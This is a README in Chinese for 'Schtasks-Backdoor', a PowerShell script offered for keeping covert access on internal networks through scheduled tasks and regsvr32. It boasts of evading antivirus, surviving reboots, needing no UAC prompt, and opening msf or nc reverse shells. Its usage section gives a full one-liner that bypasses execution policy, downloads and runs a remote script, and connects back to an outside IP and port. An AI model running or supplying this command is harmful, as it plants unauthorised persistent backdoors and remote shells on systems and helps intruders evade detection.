# Schtasks-Backdoor

## About

一款权限维持后门PowerShell脚本

原理是：schtasks+regsvr32

## Function

内网维持权限方法的一种。免杀效果好，重启生效。支持msf反弹，nc反弹，客户端不会用明显异常

自定义执行命令会有弹框（可以自己修改，思路可以使用mshta），一般实战中用nc或者msf。

## Usage

`powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 8.8.8.8 -port 8081 -time 2"`

此脚本优势就是不需要过uac权限。

## Example

![example](https://github.com/re4lity/Schtasks-Backdoor/blob/master/example.gif)
